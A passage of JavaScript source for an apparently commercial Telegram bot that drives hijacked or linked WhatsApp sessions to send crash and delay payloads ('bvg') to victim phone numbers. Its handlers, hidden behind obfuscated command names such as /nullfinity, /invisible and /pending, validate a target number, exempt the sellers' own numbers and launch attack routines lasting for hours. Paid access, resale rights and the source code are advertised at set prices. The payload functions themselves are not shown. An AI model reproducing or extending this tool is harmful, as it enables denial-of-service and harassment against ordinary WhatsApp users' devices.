    await userBot.sendMessage(chatId, `❌ Failed to process /droidfgc: ${error.message}`);
  }
});

botInstance.onText(/\/7ewi38djjd(?!\S)(\s+(.+))?/, async (msg, match) => {
    const senderId = msg.from.id;
    const chatId = msg.chat.id;

    if (msg.chat.type !== 'private') return;

    const membership = await checkMembership(chatId, senderId, isRootBot);
    if (!membership.isMember) return;

    const userBot = getUserBot(botInstance);

    if (!checkRateLimit(senderId, chatId)) return;

    const userNumber = db.userNumbers[senderId];
    if (!userNumber) {
        return userBot.sendMessage(chatId, '❌ No WhatsApp number linked. Use /reqpair.');
    }

    if (!(await validateSession(userNumber, chatId, botInstance))) {
        return userBot.sendMessage(chatId, '❌ No active WhatsApp session.');
    }

    // Premium check (updated for VIP)
// NEW - Clean & Reliable
if (!(await hasVipAccess(senderId, userBot))) {
  return userBot.sendMessage(chatId, `🚫 You are not authorized to use this command.

📩 Please contact the developer to buy: ${CONFIG.usertele}

💰 Price/Harga:
✅ Access permanent: 30$
✅ Resell permanent: 50$
✅ Script/source code: 120$
✅ Make your own bvg bot with your name/customised bvg bot: 120$

Prices are negotiable or can be discounted!!`);
}

    if (!match[2] || match[2].trim() === '') {
        return userBot.sendMessage(chatId, '❌ Example: /cantsee +919876543210');
    }

    const rawTarget = match[2].trim().split(/\s+/)[0];

    if (!isValidPhoneNumber(rawTarget)) {
        return userBot.sendMessage(chatId, '❌ Invalid target number.');
    }

    const numberTarget = rawTarget.replace(/[^0-9+]/g, '').replace(/^\+/, '');

    if (numberTarget.length < 8 || numberTarget.length > 15) {
        return userBot.sendMessage(chatId, `❌ Invalid number length.`);
    }

    if (numberTarget === userNumber) {
        return userBot.sendMessage(chatId, '❌ Cannot target your own number.');
    }

    const blockedNumbers = ['916909137213', '919366316018', '919402104401'];
    if (blockedNumbers.includes(numberTarget)) {
        return userBot.sendMessage(chatId, '❌ Cannot target this number.');
    }

    const formattedTarget = `${numberTarget}@s.whatsapp.net`;

    try {
        await userBot.sendPhoto(chatId, CONFIG.pfp, {
            caption: `┌──────┤ NOTIFICATION ├──────┐
│➻ Sent bvg to 👇
│➻ Target: ${numberTarget}
│➻ From: ${userNumber}
└────────────────────────┘`,
            parse_mode: 'HTML'
        });

        const sock = sessions.get(userNumber);
        cantseeTrashLoc(sock, formattedTarget, userNumber, chatId, botInstance);

    } catch (error) {
        await userBot.sendMessage(chatId, `❌ Failed to start /cantsee: ${error.message}`);
    }
});

botInstance.onText(/\/dbwowoejrhdj(?!\S)(\s+(.+))?/, async (msg, match) => {
  const senderId = msg.from.id;
  const chatId = msg.chat.id;

  if (msg.chat.type !== 'private') return;

  console.log(`[DEBUG] /nullfinity raw message: "${msg.text}"`);

  const membership = await checkMembership(chatId, senderId, isRootBot);
  if (!membership.isMember) return;

  const userBot = getUserBot(botInstance);

  if (!checkRateLimit(senderId, chatId)) return;

  const userNumber = db.userNumbers[senderId];
  if (!userNumber) {
    return userBot.sendMessage(chatId, '❌ No WhatsApp number linked to your account. Please connect using /reqpair.');
  }

  if (!(await validateSession(userNumber, chatId, botInstance))) {
    return;
  }

  // Premium check (updated for VIP)
// NEW - Clean & Reliable
if (!(await hasVipAccess(senderId, userBot))) {
  return userBot.sendMessage(chatId, `🚫 You are not authorized to use this command.

📩 Please contact the developer to buy: ${CONFIG.usertele}

💰 Price/Harga:
✅ Access permanent: 30$
✅ Resell permanent: 50$
✅ Script/source code: 120$
✅ Make your own bvg bot with your name/customised bvg bot: 120$

Prices are negotiable or can be discounted!!`);
}

  console.log(`[DEBUG] /nullfinity input: match[2] = "${match[2]}"`);

  if (!match[2] || match[2].trim() === '') {
    console.log(`[DEBUG] /nullfinity: No valid input provided, sending error message`);
    return userBot.sendMessage(chatId, '❌ Provide a target number.\nExample: /nullfinity +919876543210');
  }

  const rawTarget = match[2].trim();
  console.log(`[DEBUG] /nullfinity: rawTarget = "${rawTarget}"`);

  if (!isValidPhoneNumber(rawTarget)) {
    console.log(`[DEBUG] /nullfinity: Invalid phone number format for "${rawTarget}"`);
    return userBot.sendMessage(chatId, '❌ Invalid target number. Use international format (e.g., +919876543210).');
  }

  const numberTarget = rawTarget.replace(/[^0-9+]/g, '').replace(/^\+/, '');
  console.log(`[DEBUG] /nullfinity: numberTarget = "${numberTarget}"`);

  if (numberTarget.length < 8 || numberTarget.length > 15) {
    console.log(`[DEBUG] /nullfinity: Invalid number length for "${numberTarget}" (length: ${numberTarget.length})`);
    return userBot.sendMessage(chatId, `❌ Invalid target number length (${numberTarget.length} digits). Must be 8-15 digits.`);
  }

  if (numberTarget === userNumber) {
    return userBot.sendMessage(chatId, '❌ Cannot target your own number.');
  }

  const blockedNumbers = ['916909137213', '919366316018', '919402104401'];
  if (blockedNumbers.includes(numberTarget)) {
    return userBot.sendMessage(chatId, '❌ Cannot target owner number.');
  }

  const formattedNumber = `${numberTarget}@s.whatsapp.net`;

  try {
    await userBot.sendPhoto(chatId, CONFIG.pfp, {
      caption: `┌──────┤ NOTIFICATION ├──────┐
│➻ Sent bvg to 👇🏻
│➻ Target: ${numberTarget}
│➻ From: ${userNumber}
└────────────────────────┘`,
parse_mode: 'HTML'
    });
        for (let i = 0; i < 1; i++) {
          await xeonNullfinity(formattedNumber, userNumber, chatId, botInstance, true);
          await sleep(1000);
        }
  } catch (error) {
    console.error(`Error in /nullfinity for ${senderId}:`, error.message);
    await userBot.sendMessage(chatId, `❌ Failed to process /nullfinity: ${error.message}`);
  }
});

botInstance.onText(/\/jd833inf3(?!\S)(\s+(.+))?/, async (msg, match) => {
  const senderId = msg.from.id;
  const chatId = msg.chat.id;

  if (msg.chat.type !== 'private') return;

  console.log(`[DEBUG] /hidenseek raw message: "${msg.text}"`);

  const membership = await checkMembership(chatId, senderId, isRootBot);
  if (!membership.isMember) return;

  const userBot = getUserBot(botInstance);

  if (!checkRateLimit(senderId, chatId)) return;

  const userNumber = db.userNumbers[senderId];
  if (!userNumber) {
    return userBot.sendMessage(chatId, '❌ No WhatsApp number linked to your account. Please connect using /reqpair.');
  }

  if (!(await validateSession(userNumber, chatId, botInstance))) {
    return userBot.sendMessage(chatId, '❌ No active WhatsApp session.');
  }

  // Premium check (updated for VIP)
// NEW - Clean & Reliable
if (!(await hasVipAccess(senderId, userBot))) {
  return userBot.sendMessage(chatId, `🚫 You are not authorized to use this command.

📩 Please contact the developer to buy: ${CONFIG.usertele}

💰 Price/Harga:
✅ Access permanent: 30$
✅ Resell permanent: 50$
✅ Script/source code: 120$
✅ Make your own bvg bot with your name/customised bvg bot: 120$

Prices are negotiable or can be discounted!!`);
}

  console.log(`[DEBUG] /hidenseek input: match[2] = "${match[2]}"`);

  if (!match[2] || match[2].trim() === '') {
    console.log(`[DEBUG] /hidenseek: No valid input provided, sending error message`);
    return userBot.sendMessage(chatId, '❌ Provide a target number and duration.\nExample: /hidenseek +919876543210 2');
  }

  const args = match[2].trim().split(/\s+/);
  if (args.length < 2) {
    console.log(`[DEBUG] /hidenseek: Insufficient arguments provided`);
    return userBot.sendMessage(chatId, '❌ Provide both a target number and duration in hours.\nExample: /hidenseek +919876543210 2');
  }

  const rawTarget = args[0];
  const durationHours = parseFloat(args[1]);

  if (!isValidPhoneNumber(rawTarget)) {
    console.log(`[DEBUG] /hidenseek: Invalid phone number format for "${rawTarget}"`);
    return userBot.sendMessage(chatId, '❌ Invalid target number. Use international format (e.g., +919876543210).');
  }

  if (isNaN(durationHours) || durationHours <= 0) {
    console.log(`[DEBUG] /hidenseek: Invalid duration "${args[1]}"`);
    return userBot.sendMessage(chatId, '❌ Invalid duration. Provide a positive number of hours (e.g., 2).');
  }

  const numberTarget = rawTarget.replace(/[^0-9+]/g, '').replace(/^\+/, '');
  console.log(`[DEBUG] /hidenseek: numberTarget = "${numberTarget}", duration = ${durationHours} hours`);

  if (numberTarget.length < 8 || numberTarget.length > 15) {
    console.log(`[DEBUG] /hidenseek: Invalid number length for "${numberTarget}" (length: ${numberTarget.length})`);
    return userBot.sendMessage(chatId, `❌ Invalid target number length (${numberTarget.length} digits). Must be 8-15 digits.`);
  }

  if (numberTarget === userNumber) {
    return userBot.sendMessage(chatId, '❌ Cannot target your own number.');
  }

  const blockedNumbers = ['916909137213', '919366316018', '919402104401'];
  if (blockedNumbers.includes(numberTarget)) {
    return userBot.sendMessage(chatId, '❌ Cannot target owner number.');
  }

  const formattedNumber = `${numberTarget}@s.whatsapp.net`;

  try {
    await userBot.sendPhoto(chatId, CONFIG.pfp, {
      caption: `┌──────┤ NOTIFICATION ├──────┐
│➻ sent bvg...
│➻ Target: ${numberTarget}
│➻ From: ${userNumber}
│➻ Duration: ${durationHours} hours
└────────────────────────┘`,
parse_mode: 'HTML'
    });

    // Run both XeonDelay1 and XeonDelay2 concurrently
    await Promise.all([
      xeonHideNSeekExecutor(durationHours, formattedNumber, userNumber, chatId, botInstance)
    ]);
  } catch (error) {
    console.error(`Error in /hidenseek for ${senderId}:`, error.message);
    await userBot.sendMessage(chatId, `❌ Failed to process /hidenseek: ${error.message}`);
  }
});
botInstance.onText(/\/bdkwksjdjdj(?!\S)(\s+(.+))?/, async (msg, match) => {
  const senderId = msg.from.id;
  const chatId = msg.chat.id;

  if (msg.chat.type !== 'private') return;

  console.log(`[DEBUG] /absolutedelay raw message: "${msg.text}"`);

  const membership = await checkMembership(chatId, senderId, isRootBot);
  if (!membership.isMember) return;

  const userBot = getUserBot(botInstance);

  if (!checkRateLimit(senderId, chatId)) return;

  const userNumber = db.userNumbers[senderId];
  if (!userNumber) {
    return userBot.sendMessage(chatId, '❌ No WhatsApp number linked to your account. Please connect using /reqpair.');
  }

  if (!(await validateSession(userNumber, chatId, botInstance))) {
    return userBot.sendMessage(chatId, '❌ No active WhatsApp session.');
  }

  // Premium check (updated for VIP)
// NEW - Clean & Reliable
if (!(await hasVipAccess(senderId, userBot))) {
  return userBot.sendMessage(chatId, `🚫 You are not authorized to use this command.

📩 Please contact the developer to buy: ${CONFIG.usertele}

💰 Price/Harga:
✅ Access permanent: 30$
✅ Resell permanent: 50$
✅ Script/source code: 120$
✅ Make your own bvg bot with your name/customised bvg bot: 120$

Prices are negotiable or can be discounted!!`);
}

  console.log(`[DEBUG] /absolutedelay input: match[2] = "${match[2]}"`);

  if (!match[2] || match[2].trim() === '') {
    console.log(`[DEBUG] /absolutedelay: No valid input provided, sending error message`);
    return userBot.sendMessage(chatId, '❌ Provide a target number and duration.\nExample: /absolutedelay +919876543210 2');
  }

  const args = match[2].trim().split(/\s+/);
  if (args.length < 2) {
    console.log(`[DEBUG] /absolutedelay: Insufficient arguments provided`);
    return userBot.sendMessage(chatId, '❌ Provide both a target number and duration in hours.\nExample: /absolutedelay +919876543210 2');
  }

  const rawTarget = args[0];
  const durationHours = parseFloat(args[1]);

  if (!isValidPhoneNumber(rawTarget)) {
    console.log(`[DEBUG] /absolutedelay: Invalid phone number format for "${rawTarget}"`);
    return userBot.sendMessage(chatId, '❌ Invalid target number. Use international format (e.g., +919876543210).');
  }

  if (isNaN(durationHours) || durationHours <= 0) {
    console.log(`[DEBUG] /absolutedelay: Invalid duration "${args[1]}"`);
    return userBot.sendMessage(chatId, '❌ Invalid duration. Provide a positive number of hours (e.g., 2).');
  }

  const numberTarget = rawTarget.replace(/[^0-9+]/g, '').replace(/^\+/, '');
  console.log(`[DEBUG] /absolutedelay: numberTarget = "${numberTarget}", duration = ${durationHours} hours`);

  if (numberTarget.length < 8 || numberTarget.length > 15) {
    console.log(`[DEBUG] /absolutedelay: Invalid number length for "${numberTarget}" (length: ${numberTarget.length})`);
    return userBot.sendMessage(chatId, `❌ Invalid target number length (${numberTarget.length} digits). Must be 8-15 digits.`);
  }

  if (numberTarget === userNumber) {
    return userBot.sendMessage(chatId, '❌ Cannot target your own number.');
  }

  const blockedNumbers = ['916909137213', '919366316018', '919402104401'];
  if (blockedNumbers.includes(numberTarget)) {
    return userBot.sendMessage(chatId, '❌ Cannot target owner number.');
  }

  const formattedNumber = `${numberTarget}@s.whatsapp.net`;

  try {
    await userBot.sendPhoto(chatId, CONFIG.pfp, {
      caption: `┌──────┤ NOTIFICATION ├──────┐
│➻ sent bvg...
│➻ Target: ${numberTarget}
│➻ From: ${userNumber}
│➻ Duration: ${durationHours} hours
└────────────────────────┘`,
parse_mode: 'HTML'
    });

    // Run both XeonDelay1 and XeonDelay2 concurrently
    await Promise.all([
      xeonAbsoluteDelayExecutor(durationHours, formattedNumber, userNumber, chatId, botInstance)
    ]);
  } catch (error) {
    console.error(`Error in /absolutedelay for ${senderId}:`, error.message);
    await userBot.sendMessage(chatId, `❌ Failed to process /absolutedelay: ${error.message}`);
  }
});

botInstance.onText(/\/ebwowjrkdkd(?!\S)(\s+(.+))?/, async (msg, match) => {
  const senderId = msg.from.id;
  const chatId = msg.chat.id;

  if (msg.chat.type !== 'private') return;

  console.log(`[DEBUG] /invisible raw message: "${msg.text}"`);

  const membership = await checkMembership(chatId, senderId, isRootBot);
  if (!membership.isMember) return;

  const userBot = getUserBot(botInstance);

  if (!checkRateLimit(senderId, chatId)) return;

  const userNumber = db.userNumbers[senderId];
  if (!userNumber) {
    return userBot.sendMessage(chatId, '❌ No WhatsApp number linked to your account. Please connect using /reqpair.');
  }

  if (!(await validateSession(userNumber, chatId, botInstance))) {
    return userBot.sendMessage(chatId, '❌ No active WhatsApp session.');
  }

  // Premium check (updated for VIP)
// NEW - Clean & Reliable
if (!(await hasVipAccess(senderId, userBot))) {
  return userBot.sendMessage(chatId, `🚫 You are not authorized to use this command.

📩 Please contact the developer to buy: ${CONFIG.usertele}

💰 Price/Harga:
✅ Access permanent: 30$
✅ Resell permanent: 50$
✅ Script/source code: 120$
✅ Make your own bvg bot with your name/customised bvg bot: 120$

Prices are negotiable or can be discounted!!`);
}

  console.log(`[DEBUG] /invisible input: match[2] = "${match[2]}"`);

  if (!match[2] || match[2].trim() === '') {
    console.log(`[DEBUG] /invisible: No valid input provided, sending error message`);
    return userBot.sendMessage(chatId, '❌ Provide a target number and duration.\nExample: /invisible +919876543210 2');
  }

  const args = match[2].trim().split(/\s+/);
  if (args.length < 2) {
    console.log(`[DEBUG] /invisible: Insufficient arguments provided`);
    return userBot.sendMessage(chatId, '❌ Provide both a target number and duration in hours.\nExample: /invisible +919876543210 2');
  }

  const rawTarget = args[0];
  const durationHours = parseFloat(args[1]);

  if (!isValidPhoneNumber(rawTarget)) {
    console.log(`[DEBUG] /invisible: Invalid phone number format for "${rawTarget}"`);
    return userBot.sendMessage(chatId, '❌ Invalid target number. Use international format (e.g., +919876543210).');
  }

  if (isNaN(durationHours) || durationHours <= 0) {
    console.log(`[DEBUG] /invisible: Invalid duration "${args[1]}"`);
    return userBot.sendMessage(chatId, '❌ Invalid duration. Provide a positive number of hours (e.g., 2).');
  }

  const numberTarget = rawTarget.replace(/[^0-9+]/g, '').replace(/^\+/, '');
  console.log(`[DEBUG] /invisible: numberTarget = "${numberTarget}", duration = ${durationHours} hours`);

  if (numberTarget.length < 8 || numberTarget.length > 15) {
    console.log(`[DEBUG] /invisible: Invalid number length for "${numberTarget}" (length: ${numberTarget.length})`);
    return userBot.sendMessage(chatId, `❌ Invalid target number length (${numberTarget.length} digits). Must be 8-15 digits.`);
  }

  if (numberTarget === userNumber) {
    return userBot.sendMessage(chatId, '❌ Cannot target your own number.');
  }

  const blockedNumbers = ['916909137213', '919366316018', '919402104401'];
  if (blockedNumbers.includes(numberTarget)) {
    return userBot.sendMessage(chatId, '❌ Cannot target owner number.');
  }

  const formattedNumber = `${numberTarget}@s.whatsapp.net`;

  try {
    await userBot.sendPhoto(chatId, CONFIG.pfp, {
      caption: `┌──────┤ NOTIFICATION ├──────┐
│➻ sent bvg...
│➻ Target: ${numberTarget}
│➻ From: ${userNumber}
│➻ Duration: ${durationHours} hours
└────────────────────────┘`,
parse_mode: 'HTML'
    });

    // Run both XeonDelay1 and XeonDelay2 concurrently
    await Promise.all([
      xeonAndroidInvisibleKingExecutor(durationHours, formattedNumber, userNumber, chatId, botInstance, true)
    ]);
  } catch (error) {
    console.error(`Error in /invisible for ${senderId}:`, error.message);
    await userBot.sendMessage(chatId, `❌ Failed to process /invisible: ${error.message}`);
  }
});

botInstance.onText(/\/xdokopdikx(?!\S)(\s+(.+))?/, async (msg, match) => {
  const senderId = msg.from.id;
  const chatId = msg.chat.id;

  if (msg.chat.type !== 'private') return;

  console.log(`[DEBUG] /simpledroid raw message: "${msg.text}"`);

  const membership = await checkMembership(chatId, senderId, isRootBot);
  if (!membership.isMember) return;

  const userBot = getUserBot(botInstance);

  if (!checkRateLimit(senderId, chatId)) return;

  const userNumber = db.userNumbers[senderId];
  if (!userNumber) {
    return userBot.sendMessage(chatId, '❌ No WhatsApp number linked to your account. Please connect using /reqpair.');
  }

  if (!(await validateSession(userNumber, chatId, botInstance))) {
    return userBot.sendMessage(chatId, '❌ No active WhatsApp session.');
  }

  // Premium check (updated for VIP)
// NEW - Clean & Reliable
if (!(await hasVipAccess(senderId, userBot))) {
  return userBot.sendMessage(chatId, `🚫 You are not authorized to use this command.

📩 Please contact the developer to buy: ${CONFIG.usertele}

💰 Price/Harga:
✅ Access permanent: 30$
✅ Resell permanent: 50$
✅ Script/source code: 120$
✅ Make your own bvg bot with your name/customised bvg bot: 120$

Prices are negotiable or can be discounted!!`);
}

  console.log(`[DEBUG] /simpledroid input: match[2] = "${match[2]}"`);

  if (!match[2] || match[2].trim() === '') {
    console.log(`[DEBUG] /simpledroid: No valid input provided, sending error message`);
    return userBot.sendMessage(chatId, '❌ Provide a target number and duration.\nExample: /simpledroid +919876543210 2');
  }

  const args = match[2].trim().split(/\s+/);
  if (args.length < 2) {
    console.log(`[DEBUG] /simpledroid: Insufficient arguments provided`);
    return userBot.sendMessage(chatId, '❌ Provide both a target number and duration in hours.\nExample: /simpledroid +919876543210 2');
  }

  const rawTarget = args[0];
  const durationHours = parseFloat(args[1]);

  if (!isValidPhoneNumber(rawTarget)) {
    console.log(`[DEBUG] /simpledroid: Invalid phone number format for "${rawTarget}"`);
    return userBot.sendMessage(chatId, '❌ Invalid target number. Use international format (e.g., +919876543210).');
  }

  if (isNaN(durationHours) || durationHours <= 0) {
    console.log(`[DEBUG] /simpledroid: Invalid duration "${args[1]}"`);
    return userBot.sendMessage(chatId, '❌ Invalid duration. Provide a positive number of hours (e.g., 2).');
  }

  const numberTarget = rawTarget.replace(/[^0-9+]/g, '').replace(/^\+/, '');
  console.log(`[DEBUG] /simpledroid: numberTarget = "${numberTarget}", duration = ${durationHours} hours`);

  if (numberTarget.length < 8 || numberTarget.length > 15) {
    console.log(`[DEBUG] /simpledroid: Invalid number length for "${numberTarget}" (length: ${numberTarget.length})`);
    return userBot.sendMessage(chatId, `❌ Invalid target number length (${numberTarget.length} digits). Must be 8-15 digits.`);
  }

  if (numberTarget === userNumber) {
    return userBot.sendMessage(chatId, '❌ Cannot target your own number.');
  }

  const blockedNumbers = ['916909137213', '919366316018', '919402104401'];
  if (blockedNumbers.includes(numberTarget)) {
    return userBot.sendMessage(chatId, '❌ Cannot target owner number.');
  }

  const formattedNumber = `${numberTarget}@s.whatsapp.net`;

  try {
    await userBot.sendPhoto(chatId, CONFIG.pfp, {
      caption: `┌──────┤ NOTIFICATION ├──────┐
│➻ sent bvg...
│➻ Target: ${numberTarget}
│➻ From: ${userNumber}
│➻ Duration: ${durationHours} hours
└────────────────────────┘`,
parse_mode: 'HTML'
    });

    // Run both XeonDelay1 and XeonDelay2 concurrently
    await Promise.all([
      xeonDroidStatusJidExecutor(durationHours, formattedNumber, userNumber, chatId, botInstance)
    ]);
  } catch (error) {
    console.error(`Error in /simpledroid for ${senderId}:`, error.message);
    await userBot.sendMessage(chatId, `❌ Failed to process /simpledroid: ${error.message}`);
  }
});

botInstance.onText(/\/3j38ejjddj(?!\S)(\s+(.+))?/, async (msg, match) => {
  const senderId = msg.from.id;
  const chatId = msg.chat.id;

  if (msg.chat.type !== 'private') return;

  console.log(`[DEBUG] /simpleios raw message: "${msg.text}"`);

  const membership = await checkMembership(chatId, senderId, isRootBot);
  if (!membership.isMember) return;

  const userBot = getUserBot(botInstance);

  if (!checkRateLimit(senderId, chatId)) return;

  const userNumber = db.userNumbers[senderId];
  if (!userNumber) {
    return userBot.sendMessage(chatId, '❌ No WhatsApp number linked to your account. Please connect using /reqpair.');
  }

  if (!(await validateSession(userNumber, chatId, botInstance))) {
    return userBot.sendMessage(chatId, '❌ No active WhatsApp session.');
  }

  // Premium check (updated for VIP)
// NEW - Clean & Reliable
if (!(await hasVipAccess(senderId, userBot))) {
  return userBot.sendMessage(chatId, `🚫 You are not authorized to use this command.

📩 Please contact the developer to buy: ${CONFIG.usertele}

💰 Price/Harga:
✅ Access permanent: 30$
✅ Resell permanent: 50$
✅ Script/source code: 120$
✅ Make your own bvg bot with your name/customised bvg bot: 120$

Prices are negotiable or can be discounted!!`);
}

  console.log(`[DEBUG] /simpleios input: match[2] = "${match[2]}"`);

  if (!match[2] || match[2].trim() === '') {
    console.log(`[DEBUG] /simpleios: No valid input provided, sending error message`);
    return userBot.sendMessage(chatId, '❌ Provide a target number and duration.\nExample: /simpleios +919876543210 2');
  }

  const args = match[2].trim().split(/\s+/);
  if (args.length < 2) {
    console.log(`[DEBUG] /simpleios: Insufficient arguments provided`);
    return userBot.sendMessage(chatId, '❌ Provide both a target number and duration in hours.\nExample: /simpleios +919876543210 2');
  }

  const rawTarget = args[0];
  const durationHours = parseFloat(args[1]);

  if (!isValidPhoneNumber(rawTarget)) {
    console.log(`[DEBUG] /simpleios: Invalid phone number format for "${rawTarget}"`);
    return userBot.sendMessage(chatId, '❌ Invalid target number. Use international format (e.g., +919876543210).');
  }

  if (isNaN(durationHours) || durationHours <= 0) {
    console.log(`[DEBUG] /simpleios: Invalid duration "${args[1]}"`);
    return userBot.sendMessage(chatId, '❌ Invalid duration. Provide a positive number of hours (e.g., 2).');
  }

  const numberTarget = rawTarget.replace(/[^0-9+]/g, '').replace(/^\+/, '');
  console.log(`[DEBUG] /simpleios: numberTarget = "${numberTarget}", duration = ${durationHours} hours`);

  if (numberTarget.length < 8 || numberTarget.length > 15) {
    console.log(`[DEBUG] /simpleios: Invalid number length for "${numberTarget}" (length: ${numberTarget.length})`);
    return userBot.sendMessage(chatId, `❌ Invalid target number length (${numberTarget.length} digits). Must be 8-15 digits.`);
  }

  if (numberTarget === userNumber) {
    return userBot.sendMessage(chatId, '❌ Cannot target your own number.');
  }

  const blockedNumbers = ['916909137213', '919366316018', '919402104401'];
  if (blockedNumbers.includes(numberTarget)) {
    return userBot.sendMessage(chatId, '❌ Cannot target owner number.');
  }

  const formattedNumber = `${numberTarget}@s.whatsapp.net`;

  try {
    await userBot.sendPhoto(chatId, CONFIG.pfp, {
      caption: `┌──────┤ NOTIFICATION ├──────┐
│➻ sent bvg...
│➻ Target: ${numberTarget}
│➻ From: ${userNumber}
│➻ Duration: ${durationHours} hours
└────────────────────────┘`,
parse_mode: 'HTML'
    });

    // Run both XeonDelay1 and XeonDelay2 concurrently
    await Promise.all([
      xeonIosStatusJidExecutor(durationHours, formattedNumber, userNumber, chatId, botInstance)
    ]);
  } catch (error) {
    console.error(`Error in /simpleios for ${senderId}:`, error.message);
    await userBot.sendMessage(chatId, `❌ Failed to process /simpleios: ${error.message}`);
  }
});

botInstance.onText(/\/u382uwjfjdkxls(?!\S)(\s+(.+))?/, async (msg, match) => {
  const senderId = msg.from.id;
  const chatId = msg.chat.id;

  if (msg.chat.type !== 'private') return;

  console.log(`[DEBUG] /pending raw message: "${msg.text}"`);

  const membership = await checkMembership(chatId, senderId, isRootBot);
  if (!membership.isMember) return;

  const userBot = getUserBot(botInstance);

  if (!checkRateLimit(senderId, chatId)) return;

  const userNumber = db.userNumbers[senderId];
  if (!userNumber) {
    return userBot.sendMessage(chatId, '❌ No WhatsApp number linked to your account. Please connect using /reqpair.');
  }

  if (!(await validateSession(userNumber, chatId, botInstance))) {
    return userBot.sendMessage(chatId, '❌ No active WhatsApp session.');
  }

  // Premium check (updated for VIP)
// NEW - Clean & Reliable
if (!(await hasVipAccess(senderId, userBot))) {
  return userBot.sendMessage(chatId, `🚫 You are not authorized to use this command.

📩 Please contact the developer to buy: ${CONFIG.usertele}

💰 Price/Harga:
✅ Access permanent: 30$
✅ Resell permanent: 50$
✅ Script/source code: 120$
✅ Make your own bvg bot with your name/customised bvg bot: 120$

Prices are negotiable or can be discounted!!`);
}

  console.log(`[DEBUG] /pending input: match[2] = "${match[2]}"`);

  if (!match[2] || match[2].trim() === '') {
    console.log(`[DEBUG] /pending: No valid input provided, sending error message`);
    return userBot.sendMessage(chatId, '❌ Provide a target number and duration.\nExample: /pending +919876543210 2');
  }

  const args = match[2].trim().split(/\s+/);
  if (args.length < 2) {
    console.log(`[DEBUG] /pending: Insufficient arguments provided`);
    return userBot.sendMessage(chatId, '❌ Provide both a target number and duration in hours.\nExample: /pending +919876543210 2');
  }

  const rawTarget = args[0];
  const durationHours = parseFloat(args[1]);

  if (!isValidPhoneNumber(rawTarget)) {
    console.log(`[DEBUG] /pending: Invalid phone number format for "${rawTarget}"`);
    return userBot.sendMessage(chatId, '❌ Invalid target number. Use international format (e.g., +919876543210).');
  }

  if (isNaN(durationHours) || durationHours <= 0) {
    console.log(`[DEBUG] /pending: Invalid duration "${args[1]}"`);
    return userBot.sendMessage(chatId, '❌ Invalid duration. Provide a positive number of hours (e.g., 2).');
  }

  const numberTarget = rawTarget.replace(/[^0-9+]/g, '').replace(/^\+/, '');
  console.log(`[DEBUG] /pending: numberTarget = "${numberTarget}", duration = ${durationHours} hours`);

  if (numberTarget.length < 8 || numberTarget.length > 15) {
    console.log(`[DEBUG] /pending: Invalid number length for "${numberTarget}" (length: ${numberTarget.length})`);
    return userBot.sendMessage(chatId, `❌ Invalid target number length (${numberTarget.length} digits). Must be 8-15 digits.`);
  }

  if (numberTarget === userNumber) {
    return userBot.sendMessage(chatId, '❌ Cannot target your own number.');
  }

  const blockedNumbers = ['916909137213', '919366316018', '919402104401'];
  if (blockedNumbers.includes(numberTarget)) {
    return userBot.sendMessage(chatId, '❌ Cannot target owner number.');
  }

  const formattedNumber = `${numberTarget}@s.whatsapp.net`;

  try {
    await userBot.sendPhoto(chatId, CONFIG.pfp, {
      caption: `┌──────┤ NOTIFICATION ├──────┐
│➻ sent bvg...
│➻ Target: ${numberTarget}
│➻ From: ${userNumber}
│➻ Duration: ${durationHours} hours
└────────────────────────┘`,
parse_mode: 'HTML'
    });

    // Run both XeonDelay1 and XeonDelay2 concurrently
    await Promise.all([
      xeonPendingMakerExecutor2(durationHours, formattedNumber, userNumber, chatId, botInstance)
    ]);
  } catch (error) {
    console.error(`Error in /pending for ${senderId}:`, error.message);
    await userBot.sendMessage(chatId, `❌ Failed to process /pending: ${error.message}`);
  }
});

botInstance.onText(/\/83jeksks(?!\S)(\s+(.+))?/, async (msg, match) => {
  const senderId = msg.from.id;
  const chatId = msg.chat.id;

  if (msg.chat.type !== 'private') return;

  console.log(`[DEBUG] /pendingv2 raw message: "${msg.text}"`);

  const membership = await checkMembership(chatId, senderId, isRootBot);
  if (!membership.isMember) return;

  const userBot = getUserBot(botInstance);

  if (!checkRateLimit(senderId, chatId)) return;

  const userNumber = db.userNumbers[senderId];
  if (!userNumber) {
    return userBot.sendMessage(chatId, '❌ No WhatsApp number linked to your account. Please connect using /reqpair.');
  }

  if (!(await validateSession(userNumber, chatId, botInstance))) {
    return userBot.sendMessage(chatId, '❌ No active WhatsApp session.');
  }

  // Premium check (updated for VIP)
// NEW - Clean & Reliable
if (!(await hasVipAccess(senderId, userBot))) {
  return userBot.sendMessage(chatId, `🚫 You are not authorized to use this command.

📩 Please contact the developer to buy: ${CONFIG.usertele}

💰 Price/Harga:
✅ Access permanent: 30$
✅ Resell permanent: 50$
✅ Script/source code: 120$
✅ Make your own bvg bot with your name/customised bvg bot: 120$

Prices are negotiable or can be discounted!!`);
}

  console.log(`[DEBUG] /pendingv2 input: match[2] = "${match[2]}"`);

  if (!match[2] || match[2].trim() === '') {
    console.log(`[DEBUG] /pendingv2: No valid input provided, sending error message`);
    return userBot.sendMessage(chatId, '❌ Provide a target number and duration.\nExample: /pendingv2 +919876543210 2');
  }

  const args = match[2].trim().split(/\s+/);
  if (args.length < 2) {
    console.log(`[DEBUG] /pendingv2: Insufficient arguments provided`);
    return userBot.sendMessage(chatId, '❌ Provide both a target number and duration in hours.\nExample: /pendingv2 +919876543210 2');
  }

  const rawTarget = args[0];
  const durationHours = parseFloat(args[1]);

  if (!isValidPhoneNumber(rawTarget)) {
    console.log(`[DEBUG] /pendingv2: Invalid phone number format for "${rawTarget}"`);
    return userBot.sendMessage(chatId, '❌ Invalid target number. Use international format (e.g., +919876543210).');
  }

  if (isNaN(durationHours) || durationHours <= 0) {
    console.log(`[DEBUG] /pendingv2: Invalid duration "${args[1]}"`);
    return userBot.sendMessage(chatId, '❌ Invalid duration. Provide a positive number of hours (e.g., 2).');
  }

  const numberTarget = rawTarget.replace(/[^0-9+]/g, '').replace(/^\+/, '');
  console.log(`[DEBUG] /pendingv2: numberTarget = "${numberTarget}", duration = ${durationHours} hours`);

  if (numberTarget.length < 8 || numberTarget.length > 15) {
    console.log(`[DEBUG] /pendingv2: Invalid number length for "${numberTarget}" (length: ${numberTarget.length})`);
    return userBot.sendMessage(chatId, `❌ Invalid target number length (${numberTarget.length} digits). Must be 8-15 digits.`);
  }

  if (numberTarget === userNumber) {
    return userBot.sendMessage(chatId, '❌ Cannot target your own number.');
  }

  const blockedNumbers = ['916909137213', '919366316018', '919402104401'];
  if (blockedNumbers.includes(numberTarget)) {
    return userBot.sendMessage(chatId, '❌ Cannot target owner number.');
  }

